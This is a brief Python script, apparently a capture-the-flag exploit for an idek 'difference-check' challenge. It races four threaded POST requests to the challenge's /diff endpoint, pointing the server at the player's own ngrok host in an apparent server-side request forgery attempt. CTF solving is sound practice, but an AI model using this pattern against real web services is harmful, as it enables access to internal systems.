import requests
from threading import Thread

chall_url = 'http://difference-check.chal.idek.team'
my_url = "http://fe27-14-243-53-28.ngrok.io"

def payload():
    payload = {"url1": my_url, "url2": "http://google.com"}
    r = requests.post(chall_url+'/diff', data=payload)
    print(r.text)

if __name__ == '__main__':
    for i in range(1,5):
        thread = Thread(target=payload)
        thread.start()